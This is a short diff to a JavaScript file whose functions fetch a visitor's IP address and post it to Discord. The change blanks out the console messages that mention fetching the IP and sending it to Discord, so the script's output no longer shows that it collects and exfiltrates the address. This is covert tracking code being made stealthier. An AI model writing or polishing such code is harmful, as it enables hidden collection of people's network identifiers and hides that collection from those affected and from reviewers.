@@ -11,14 +11,14 @@ async function getIP() {
         const data = await response.json();
         return data.ip;
     } catch (error) {
-        console.error("Error fetching IP:", error);
+        console.error("", error);
         return null;
     }
 }
 
 async function sendToDiscord(ip) {
     if (!ip) {
-        console.error("IP address is null or undefined.");
+        console.error("");
         return;
     }
 
@@ -36,9 +36,9 @@ async function sendToDiscord(ip) {
         });
 
         if (response.ok) {
-            console.log("IP sent to Discord successfully!");
+            console.log("");
         } else {
-            console.error("Error sending IP to Discord:", response.statusText);
+            console.error("", response.statusText);
         }
     } catch (error) {
         console.error("Error:", error);
